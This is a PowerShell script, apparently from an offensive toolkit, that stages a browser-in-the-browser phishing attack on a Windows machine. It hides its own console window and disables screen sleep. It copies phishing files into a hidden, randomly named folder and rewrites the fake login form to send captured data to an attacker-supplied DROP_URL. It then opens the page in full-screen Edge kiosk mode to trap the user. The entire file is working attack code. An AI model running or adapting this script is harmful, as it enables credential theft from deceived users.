#
# Author:       TW-D
# Version:      1.0
#

param (
    [string] $BITB_THEME,
    [string] $BITB_TITLE,
    [string] $BITB_URL,
    [string] $BITB_TEMPLATE,
    [string] $DROP_URL
)

# Hide "PowerShell" window.
#
$Script:showWindowAsync = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
$showWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null

If ($BITB_THEME -And $BITB_TITLE -And $BITB_URL -And $BITB_TEMPLATE -And $DROP_URL) {

    # Change "monitor-timeout (AC and DC)" at NEVER with "powercfg" utility.
    #
    (powercfg /Change monitor-timeout-ac 0); (powercfg /Change monitor-timeout-dc 0)

    # Change "standby-timeout (AC and DC)" at NEVER with "powercfg" utility.
    #
    (powercfg /Change standby-timeout-ac 0); (powercfg /Change standby-timeout-dc 0)

    # Copies and hides the phishing folder in the current user's directory.
    #
    $random_name = ( -join ( (0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 8  | % {[char] $_} ) )
    $phishing_path = "${HOME}\${random_name}\"
    Copy-Item -Path ".\phishing_files\" -Destination "${phishing_path}" -Recurse
    (Get-Item "${phishing_path}" -Force).Attributes = "Hidden"

    # Builds the configuration file for the phishing page.
    #
    "const BITB_THEME = '${BITB_THEME}';" | Out-File -FilePath "${phishing_path}TMP.js"
    "const BITB_TITLE = '${BITB_TITLE}';" | Out-File -FilePath "${phishing_path}TMP.js" -Append
    "const BITB_URL = '${BITB_URL}';" | Out-File -FilePath "${phishing_path}TMP.js" -Append
    "const BITB_TEMPLATE = '${BITB_TEMPLATE}';" | Out-File -FilePath "${phishing_path}TMP.js" -Append

    # Updating the destination of the form data.
    #
    (Get-Content "${phishing_path}templates\${BITB_TEMPLATE}") -Replace "--DROP_URL--", "${DROP_URL}" | Set-Content "${phishing_path}templates\${BITB_TEMPLATE}"

    # Full screen opening of the phishing HTML page using "Microsoft Edge" in kiosk mode.
    #
    $phishing_path = ($phishing_path -Replace '[\\/]', '/')
    & "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --app="file:///${phishing_path}index.html" --kiosk --kiosk-idle-timeout-minutes=0 --edge-kiosk-type=fullscreen --no-first-run

}